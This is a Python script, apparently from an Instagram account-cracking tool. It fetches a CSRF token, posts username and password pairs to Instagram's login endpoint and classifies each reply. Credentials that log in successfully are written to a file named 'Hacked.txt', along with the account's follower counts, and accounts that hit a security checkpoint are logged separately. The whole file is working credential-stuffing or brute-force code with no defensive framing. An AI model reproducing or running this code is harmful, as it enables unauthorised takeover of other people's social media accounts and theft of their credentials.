import requests, re
AGENT = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'}
agent = 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0'

def Header_Generator(user, password, sess, agent):
    headers = {
        'Host': 'www.instagram.com',
        'User-Agent': agent,
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Referer': 'https://www.instagram.com/',
        'X-CSRFToken': '',
        'X-Instagram-AJAX': '1',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': '',
        'Cookie': '',
        'Connection': 'keep-alive'
    }
    datas = {'username': user, 'password': password}
    csrf_token = re.search('(?<=\"csrf_token\":\")\w+', sess.text).group(0)
    headers['X-CSRFToken'] = csrf_token
    headers['Cookie'] = "csrftoken={}; ig_pr=1; ig_vw=1366".format(csrf_token)
    lenthofData = str(19 + len(datas['username']) + len(datas['password']))
    headers['Content-Length'] = lenthofData
    return headers, datas

def Followers(username):
    try:
        R = requests.get('https://www.instagram.com/{}'.format(username), timeout=10, headers=AGENT)
        Count = re.findall('<meta property="og:description" content="(.*) Followers, (.*) Following, (.*) Posts - ',
                           str(R.content))
        return ' --> {} Followers, {} Following, {} Posts'.format(Count[0][0], Count[0][1], Count[0][2])
    except:
        return ' --> 0 Followers, 0 Following, 0 Posts'

def Login(username, password):
    try:
        Heddata = requests.get('https://www.instagram.com', headers=AGENT, timeout=10)
        sess = requests.session()
        headers, datas = Header_Generator(str(username), str(password), Heddata, agent)
        GoT = sess.post('https://www.instagram.com/accounts/login/ajax/', headers=headers, data=datas, timeout=10)
        if 'Oops, an error occurred.' in str(GoT.content):
            return 'Oops'
        elif 'Please wait a few minutes before you try again' in str(GoT.content):
            return 'Blocked'
        elif 'checkpoint_required' in str(GoT.content):
            try:
                Challenge = re.findall('"checkpoint_url": "(.*)"', str(GoT.content))[0].split('"')[0]
                with open('verify.txt', 'a') as XW:
                    XW.write('{}|{} --> {} {}'.format(username, password, Challenge, Followers(username)))
            except:
                pass
            return 'Challenge'
        elif 'Sorry, there was a problem with your request.' in str(GoT.content):
            return 'Problem'
        elif '"authenticated": true' in str(GoT.content):
            with open('Hacked.txt', 'a') as XW:
                XW.write('{}|{} {}'.format(username, password, Followers(username)))
            return 'LoggedIN'
        else:
            return 'Nono'
    except:
        return 'Problem'
